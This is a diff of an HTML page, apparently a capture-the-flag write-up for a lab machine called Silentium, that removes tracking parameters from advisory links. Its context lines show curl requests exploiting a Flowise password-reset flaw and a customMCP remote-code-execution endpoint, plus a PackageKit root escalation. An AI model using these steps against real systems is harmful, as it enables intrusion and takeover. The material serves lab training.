@@ -692,7 +692,7 @@
 <h2 id="exploitation-initial-access">Exploitation &amp; Initial Access<a class="headerlink" href="#exploitation-initial-access" title="Permanent link">&para;</a></h2>
 <p><img alt="4" src="../images/silentium/4.png" /></p>
 <h3 id="password-reset-flaw-cve-2025-58434">Password Reset Flaw (CVE-2025-58434)<a class="headerlink" href="#password-reset-flaw-cve-2025-58434" title="Permanent link">&para;</a></h3>
-<p>Analyzing the application against known vulnerabilities for this version reveals <a href="https://github.com/advisories/GHSA-wgpv-6j63-x5ph?utm_source=gemini">CVE-2025-58434</a>. Initiate a password reset request targeting user <code>ben@silentium.htb</code>:</p>
+<p>Analyzing the application against known vulnerabilities for this version reveals <a href="https://github.com/advisories/GHSA-wgpv-6j63-x5ph">CVE-2025-58434</a>. Initiate a password reset request targeting user <code>ben@silentium.htb</code>:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://staging.silentium.htb/api/v1/account/forgot-password<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">'{"user":{"email":"ben@silentium.htb"}}'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq
@@ -734,7 +734,7 @@
 <p><img alt="6" src="../images/silentium/6.png" /></p>
 <hr />
 <h3 id="remote-code-execution-in-flowise-cve-2025-59528">Remote Code Execution in Flowise (CVE-2025-59528)<a class="headerlink" href="#remote-code-execution-in-flowise-cve-2025-59528" title="Permanent link">&para;</a></h3>
-<p>With authenticated access, target <a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p?utm_source=gemini">CVE-2025-59528</a> in Flowise to obtain remote code execution via <code>customMCP</code>:</p>
+<p>With authenticated access, target <a href="https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p">CVE-2025-59528</a> in Flowise to obtain remote code execution via <code>customMCP</code>:</p>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://staging.silentium.htb/api/v1/node-load-method/customMCP<span class="w"> </span><span class="se">\</span>
 </span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">"Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"</span><span class="w"> </span><span class="se">\</span>
@@ -819,8 +819,8 @@
 <h3 id="exploiting-packagekit-pack2theroot">Exploiting PackageKit (Pack2TheRoot)<a class="headerlink" href="#exploiting-packagekit-pack2theroot" title="Permanent link">&para;</a></h3>
 <p>The installed version <code>PackageKit 1.2.8-2ubuntu1.4</code> is vulnerable to a TOCTOU race condition allowing local privilege escalation to root:</p>
 <ul>
-<li>Reference: <a href="https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv?utm_source=gemini">GHSA-f55j-vvr9-69xv</a></li>
-<li>Advisory: <a href="https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html?utm_source=gemini">Pack2TheRoot LPE Analysis</a></li>
+<li>Advisory: <a href="https://github.com/PackageKit/PackageKit/security/advisories/GHSA-f55j-vvr9-69xv">GHSA-f55j-vvr9-69xv</a></li>
+<li>Reference: <a href="https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html">Pack2TheRoot LPE Analysis</a></li>
 </ul>
 <p>Execute the Pack2TheRoot exploit vector against PackageKit to achieve full <code>root</code> privilege escalation on <code>silentium.htb</code>.</p>
 <p><img alt="8" src="../images/silentium/8.png" /></p>
